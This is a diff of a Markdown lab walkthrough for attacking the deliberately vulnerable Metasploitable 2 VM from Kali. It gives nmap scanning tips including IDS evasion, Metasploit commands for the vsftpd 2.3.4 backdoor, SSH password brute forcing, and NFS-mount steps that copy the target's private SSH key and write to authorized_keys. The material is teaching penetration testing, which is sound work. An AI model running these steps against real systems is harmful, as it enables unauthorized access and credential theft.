@@ -1,5 +1,7 @@
 # Server Side Attacks: 
-These are the type of attacks which is used to gained unauthorized acess to the system by exploiting the vulnerabilites or misconfiguration of the Software, OS and the services running on the target machine. These attacks do not require any user/client interaction as it mainly focus on vulnerabilites present in the target system. For these type of attacks the target should have on the same network or may have a public ip like servers i.e the target should be reachable from the target machine(Not hidden behind the routers). If the target is not reachable then these type of attacks are failed. For that case try using client side attacks.
+These are the type of attacks which is used to gained unauthorized acess to the system by exploiting the vulnerabilites or misconfiguration of the Software, OS and the services running on the target machine. 
+
+These attacks do not require any user/client interaction as it mainly focus on vulnerabilites present in the target system. For these type of attacks the target should have on the same network or may have a public ip like servers i.e the target should be reachable from the target machine(Not hidden behind the routers). If the target is not reachable then these type of attacks are failed, For that case try using **client side attacks**.
 
 ## Server Side Attacks includes:
   **Injection Flaws** (e.g., SQL Injection): In this, Attacker sends malicious code to interact with a database, leading to data theft or manipulation.
@@ -13,14 +15,15 @@ These are the type of attacks which is used to gained unauthorized acess to the 
 ---
 # Exploiting the Various Vulerabilities of **Metasploitable 2** Machine :
 
-Metasploitable 2 is a deliberately vulnerable virtual machine used for practicing penetration testing techniques. In this guide will demonstrate how to exploit the various vulnerabilities of the Metasploitable 2 Machine using my Kali Linux Machine. So lets get started:
+Metasploitable 2 is a deliberately vulnerable virtual machine used for practicing penetration testing techniques. In this guide I will demonstrate how to exploit the various vulnerabilities of the Metasploitable 2 Machine using my Kali Linux Machine. So lets get started
 
 ## Tools Used :
 ### 1. **Nmap** (Network Mapper)
-Nmap is an open-source tool used for network discovery and security auditing. It is widely used to **scan and map networks**, **identify open ports**, **services running on different port**, **Operating system detection**and **discover vulnerabilities**.
-The main problem with this tools is that it is quite noisy i.e It can easily detected by the IDS and IPS software and by setting certain rules they can block the nmap scan. But by using different scanning techinques like **Inverse tcp flag Scanning**,**Decoys** and Specifing **Timing Templates** etc can bypass the IDS and IPS rules.
-***Some key features include***:
+Nmap is an open-source tool used for network discovery and security auditing. It is widely used to **scan and map networks**, **identify open ports**, **services running on different port**, **Operating system detection** and **discover vulnerabilities**.
 
+The main problem with this tools is that it is **quite noisy** i.e It can easily detected by the IDS and IPS software and by setting certain rules they can block the nmap scan. But by using different scanning techinques like **Inverse tcp flag Scanning**,**Decoys** and Specifing **Timing Templates** etc can bypass the IDS and IPS rules.
+
+***Some key features include***:
 1. **Port Scanning**: Identifies open and closed ports on a network or particular machine.
 2. **Service Version Detection**: Determines the version of services running on open ports(like, FTP, SSH).
 3. **OS Detection**: Detects the operating system of the target machine.
@@ -41,7 +44,7 @@ Metasploit is an open-source penetration testing platform that allows cybersecur
  ---
 # Step 1 Enummeration or Reconnasissance
 
-This is the first step in the penetration testing known as Information Gathering step. In this step Gather as much information as you can about the target. It includes find ip addresses, public information about the target, Target OS, various services running on target, open port, its domain and subdomain etc. This phase is very crucial to further carry out in both server side and client side attack.
+This is the first step in the penetration testing also known as Information Gathering step. In this step Gather as much information as you can about the target. It includes find ip addresses, public information about the target, Target OS, various services running on target, open port, its domain and subdomain etc. This phase is very crucial to further carry out in both server side and client side attack.
 It was categorised in two categories:
 
 **1. Passive Scanning**: In passive scanning we gather information about the target that is publically available i.e with interacting with the target like the target domain, its subdomain, technology stack etc.
@@ -50,6 +53,7 @@ It was categorised in two categories:
 
 ## Lets start by Gathering information about our taget Metasploitable 2:
 **As we Know that the target is our local machine in our virtual homelab environment So there is not much public information available about our target. So we skip the passive reconn step and move to the Active Scanning**
+
 **Step 1** Now first as we know that the target machine is inside our homelab network but we don't know the ip address of the target.So firstly start with a Hostscan with nmap over entire network to get the ip address of our target Metasploitable 
 ```
 nmap -sn 192.168.1.100/24
@@ -121,13 +125,13 @@ password=
 **Output**
 []
 
-**Now we have successfully gained access to the ftp server of our target which has misconfigured ftp service. But with the ftp server of metasploit we can perform that much shell operation as its limited scope of transfering files to the server only.
+**Now we have successfully gained access to the ftp server of our target which has misconfigured ftp service. But with the ftp server of metasploit we can't perform that much shell operation as its limited scope of transfering files to the server only**.
 
 **2. Exploiting Backdoor commmand Execution Vulnerability**: This version of vsftp-2.3.4 has a inbuild backdoor present in its source code which allows as to execute full system command once we got successfully connected to that backdoor.
 
 1. Firstly search for the exploit available for this vulnerability, by searching **vsftpd-2.3.4 exploit** on google or any search engine.
 2. From that we got to know that there is metasploit exploit module that can be used to connect to this backdoor.
-3. Now exploit this vulnerability using metasploit vsftp exploit as"
+3. Now exploit this vulnerability using metasploit vsftp exploit as:
 ```
 #Run the metasploit framework cli using cmd
 msfconsole
@@ -142,7 +146,7 @@ set RPORT 21
 #Run the exploit
 exploit
 ```
-** After running the exploit, a shell session is estabilise with the target machine and you execute any linux command on the target machine.**
+**After running the exploit, a shell session is estabilise with the target machine and you execute any linux command on the target machine.**
 To get the above script -> ! [here]()
 
 
@@ -164,12 +168,13 @@ To exploit/attack the ssh service i.e to get the ssh connection to the target we
 1. **Bruteforcing the ssh with username and passwords.**
 2. **Using key based authentication.**
 
-**1. Bruteforcing the ssh with username and passwords**:
+#### 1. Bruteforcing the ssh with username and passwords**:
+**--> Using /auxiliary/scanner/ssh/ssh_login** module
  As we know the target ssh services allows password based authentication. So we can bruteforce the login attemps using a wordlist. For this we have an auxiliary module in the metasploit framework. Let start the attack
  ```
 #Start the metasploit cli
 msfconsole
-#search for the auxiliar module
+#search for the auxiliary module
 search ssh_login
 use auxiliary/scanner/ssh/ssh_login
 #check for the fields
@@ -182,7 +187,53 @@ set USER_AS_PASSWORD true
 set VERBOSE true
 exploit
 ```
-Now this module will brute force the ssh login with the wordlist and if there is a match we get the username and password for that ssh server if it has default password or weak password. If it does get the login parameter use your custom wordlist.
+Now this module will brute force the ssh login with the wordlist and if there is a match we get the username and password for that ssh server.We get them easily, if it has default crudential or weak password. If this doesn't get the result parameter create your custom wordlist as per you target info and use them.
 **Output**
 []
-In my case I am using metasploitable default login crudential, get the result as **username= msfadmin** and **password= msfadmin**
+In my case I am using metasploitable default login crudential, get the result as **username= msfadmin** and **password= msfadmin**.
+
+
+#### 2. Private ssh-Key based Authentication**:
+**--> Using auxiliary/scanner/ssh/ssh_login_pubkey**
+In this attack we are going to Sniff the target private key and try to gain access using them. 
+With that private key we are not only able to access the target machine, but also we can access all the remote server that trust the target client key.
+**(Note that we could also plant your own ssh public keys on the target, by adding them into the target machine's .ssh/authorized_keys file, but this technique would allow you to only access the target metasploitable machine, wile the above method provide access to not only the metasploitabe machine but also the remote machine/server which truse the target private key.)**
+
+##### Obtaining target Private keys:
+For this attack to carry on and to get the private key of target, **We need to have access to the target file system along with read and write permissions**. In this case, our metasploitable machine is configure to provide **NFS(network file system) server on port 2096** that allows any devices in the network can mount the **'/' file system** of metasploitable machien along with **read and write permission** which is a very bad configuration. So by using NFS we can mount metasploitable '/' directory to our attacker machines. Here we go:
+```
+#for this we have the nfs-client and rpcbind service package should be insalled
+#Check for what filesystem is mountable
+showmount -e 192.168.1.103
+#Start the rpcbind services
+service rpcbind start
+#choose a directory where to mount the target filesystem, I choose a new target directory in the tmp folder
+mkdir /tmp/target
+mount -t nfs 192.168.1.103:/ /tmp/target
+#copy the target public key to its authorized_keys
+cat /tmp/target/home/msfadmin/.ssh/id_rsa.pub >> /tmp/target/home/msfadmin/.ssh/authorized_keys
+#cwe can also plant our own public key to target authorized_keys 
+#cp /home/kali/.ssh/id_rsa.pub /tmp/target/home/msfadmin/.ssh/autherized_keys/
+#Sniff the target private key as target_id_rsa
+cp /tmp/target/home/msfadmin/.ssh/id_rsa /home/kali/target_id_rsa
+#Unmount the file system
+umount /tmp/target
+
+```
+Now we have placed target machine's public key into its authorized keys of the target and sniffed its private key. We can simply connect to the target using ssh-client with the target private key, but here I am using ssh_login_pubkey auxiliary of the metasploit frameowork because it automate the task of authentication if we have **multiple private keys** and didn't know which key is used to authenticate with the target, or we have **multiple targets** or we have **multiple users and key pair**, In that case we use this modules to automatically trying to authenticate with username and keys-pairs instead of manually checking.
+```
+msfconsole
+msf>search ssh_login_pubkey
+msf> use auxiliary/scanner/ssh/ssh_login_pubkey
+msf  auxiliary(ssh_login_pubkey) > options
+msf  auxiliary(ssh_login_pubkey) > set RHOSTS 192.168.1.103
+msf  auxiliary(ssh_login_pubkey) > set KEY_FILE /home/kali/target_id_rsa
+msf auxiliary(ssh_login_pubkey) > set USERNAME msfadmin
+msf auxiliary(ssh_login_pubkey) > exploit
+
+```
+**Output**
+[]
+
+---
+
